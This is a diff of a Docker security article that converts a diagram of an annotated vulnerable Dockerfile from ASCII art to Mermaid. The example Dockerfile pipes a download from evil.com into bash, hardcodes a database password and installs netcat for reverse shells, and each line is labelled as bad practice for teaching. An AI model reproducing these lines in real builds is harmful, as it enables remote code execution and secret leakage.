@@ -14,30 +14,18 @@ A poorly constructed Dockerfile dramatically increases the attack surface of the
 
 ## The Anatomy of a Vulnerable Build
 
-```text
-+---------------------------------------------------------------------------------+
-|                              Vulnerable Dockerfile                              |
-+---------------------------------------------------------------------------------+
-| FROM ubuntu:latest                   <-- Untrusted/Bloated Base Image           |
-| USER root                            <-- Running as root (Default, but bad)     |
-| RUN apt-get update && \                                                         |
-|     apt-get install -y curl netcat   <-- Installing Hacker Tools                |
-| COPY . /app                          <-- Overly broad copy (No .dockerignore)   |
-| ENV DB_PASS=supersecret              <-- Hardcoded Secrets in ENV               |
-| RUN curl http://evil.com/setup.sh | bash <-- Arbitrary remote execution         |
-| CMD ["python", "/app/main.py"]                                                  |
-+---------------------------------------------------------------------------------+
-                                      |
-                                      V
-+---------------------------------------------------------------------------------+
-|                              Resulting Container Image                          |
-+---------------------------------------------------------------------------------+
-| - Massive attack surface (full Ubuntu userland).                                |
-| - Contains netcat and curl (perfect for reverse shells).                        |
-| - Source code, local config files, and potentially local secrets copied in.     |
-| - DB_PASS visible to anyone who runs `docker inspect`.                          |
-| - Application runs as root. If app is compromised, container is compromised.    |
-+---------------------------------------------------------------------------------+
+```mermaid
+graph TD
+    A[Vulnerable Dockerfile] --> B[Resulting Container Image]
+    A1[FROM ubuntu:latest<br/>Untrusted/Bloated Base Image] --- A
+    A2[USER root<br/>Running as root Default, but bad] --- A
+    A3[RUN apt-get update && apt-get install -y curl netcat<br/>Installing Hacker Tools] --- A
+    A4[COPY . /app<br/>Overly broad copy No .dockerignore] --- A
+    A5[ENV DB_PASS=supersecret<br/>Hardcoded Secrets in ENV] --- A
+    A6[RUN curl http://evil.com/setup.sh | bash<br/>Arbitrary remote execution] --- A
+    A7[CMD python /app/main.py] --- A
+    
+    B1[- Massive attack surface full Ubuntu userland.<br/>- Contains netcat and curl perfect for reverse shells.<br/>- Source code, local config files, and potentially local secrets copied in.<br/>- DB_PASS visible to anyone who runs docker inspect.<br/>- Application runs as root. If app is compromised, container is compromised.] --- B
 ```
 
 ## Deep Dive: Common Misconfigurations and Exploitation
